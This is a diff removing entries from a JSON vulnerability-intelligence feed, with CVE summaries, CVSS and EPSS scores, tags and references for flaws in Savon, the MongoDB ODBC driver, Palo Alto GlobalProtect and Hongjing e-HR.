-      "https://access.redhat.com/errata/RHSA-2026:41928",
-      "https://access.redhat.com/errata/RHSA-2026:41941",
-      "https://access.redhat.com/errata/RHSA-2026:41944",
-      "https://access.redhat.com/errata/RHSA-2026:42078",
-      "https://access.redhat.com/errata/RHSA-2026:44235",
-      "https://access.redhat.com/errata/RHSA-2026:48699",
-      "https://access.redhat.com/errata/RHSA-2026:54188",
-      "https://access.redhat.com/errata/RHSA-2026:56789",
-      "https://access.redhat.com/errata/RHSA-2026:56854",
-      "https://access.redhat.com/errata/RHSA-2026:56912",
-      "https://access.redhat.com/errata/RHSA-2026:59833",
-      "https://access.redhat.com/errata/RHSA-2026:60023",
-      "https://access.redhat.com/errata/RHSA-2026:8483",
-      "https://access.redhat.com/errata/RHSA-2026:8484",
-      "https://access.redhat.com/errata/RHSA-2026:8490",
-      "https://access.redhat.com/errata/RHSA-2026:8491",
-      "https://access.redhat.com/errata/RHSA-2026:8493",
-      "https://access.redhat.com/errata/RHSA-2026:8498",
-      "https://access.redhat.com/errata/RHSA-2026:9385",
-      "https://access.redhat.com/errata/RHSA-2026:9742",
-      "https://access.redhat.com/security/cve/CVE-2026-4800",
-      "https://bugzilla.redhat.com/show_bug.cgi?id=2453496",
-      "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-4800.json"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 2.8,
-    "epss_percentile": 85.4,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 80.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-53510",
-    "published": "2026-07-31T20:16:51.530",
-    "last_modified": "2026-09-09T20:55:04.493",
-    "cvss_v3": 8.1,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "Savon is a Ruby SOAP client. From 0.9.8 until 2.17.2, Savon::Model .all_operations interpolates attacker-controlled WSDL operation names into Ruby source passed to module_eval, allowing Ruby code execution in the application process. This issue is fixed in version 2.17.2.",
-    "references": [
-      "https://github.com/savonrb/savon/commit/8f22eb543e7436f6247172c9be47e22792d375e9",
-      "https://github.com/savonrb/savon/releases/tag/v2.17.2",
-      "https://github.com/savonrb/savon/security/advisories/GHSA-mx5j-mp4f-g8jg"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 35.4,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 80.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-19004",
-    "published": "2026-08-12T21:17:37.577",
-    "last_modified": "2026-09-11T18:59:45.797",
-    "cvss_v3": 8.1,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "An application using the MongoDB BI Connector ODBC Driver may experience a memory-safety issue when processing output parameters from a stored procedure. Triggering this issue requires connecting to an untrusted or impersonated database server that returns crafted metadata. This may result in process termination, disclosure of process memory, or, under certain conditions, arbitrary code execution.",
-    "references": [
-      "https://github.com/mongodb/mongo-bi-connector-odbc-driver/releases/tag/v1.4.9"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 31.4,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 80.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-0297",
-    "published": "2026-08-13T03:16:45.077",
-    "last_modified": "2026-09-10T17:07:52.880",
-    "cvss_v3": 8.1,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "A buffer overflow vulnerability exists in the Palo Alto Networks GlobalProtect™ app that enables a man-in-the-middle (MitM) attacker or a rogue gateway to disrupt system processes and potentially execute arbitrary code with elevated privileges (SYSTEM privileges on Windows, and root privileges on macOS and Linux).",
-    "references": [
-      "https://security.paloaltonetworks.com/CVE-2026-0297"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.3,
-    "epss_percentile": 23.6,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 80.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-0298",
-    "published": "2026-08-13T03:16:45.560",
-    "last_modified": "2026-09-10T17:01:09.003",
-    "cvss_v3": 8.1,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "An improper input validation vulnerability exists in the Windows Pre-Logon Access Provider (PLAP) component of the Palo Alto Networks GlobalProtect™ app on Windows devices which enables a man-in-the-middle (MitM) attacker to execute arbitrary code with SYSTEM privileges on an affected client.\n\nThe GlobalProtect app on Linux, macOS, iOS, Android, and Chrome OS  is not affected.",
-    "references": [
-      "https://security.paloaltonetworks.com/CVE-2026-0298"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.3,
-    "epss_percentile": 26.4,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 80.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2024-58374",
-    "published": "2026-08-13T18:17:16.433",
-    "last_modified": "2026-09-09T20:35:08.537",
-    "cvss_v3": 7.5,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "Hongjing e-HR contains an unauthenticated SQL injection vulnerability in the getSdutyTree servlet endpoint that allows remote unauthenticated attackers to access protected resources by supplying a path traversal sequence in the request URI to bypass the oauthservlet authentication filter. Attackers can inject UNION-based SQL payloads through the unsanitized codeitemid parameter into the underlying Microsoft SQL Server query to retrieve sensitive database contents including user credentials. Exploitation evidence was first observed by the Shadowserver Foundation on 2024-07-30 (UTC).",
-    "references": [
-      "https://cn-sec.com/archives/2926383.html",
-      "https://www.ddpoc.com/DVB-2024-7391.html",
-      "https://www.vulncheck.com/advisories/hongjing-e-hr-unauthenticated-sql-injection-via-getsdutytree"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.5,
-    "epss_percentile": 39.7,
-    "tags": [
-      "path_traversal",
-      "sqli"
-    ],
-    "intel_score": 80.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "sqli+18",
-      "path_traversal+15"
     ]
   }
 ]
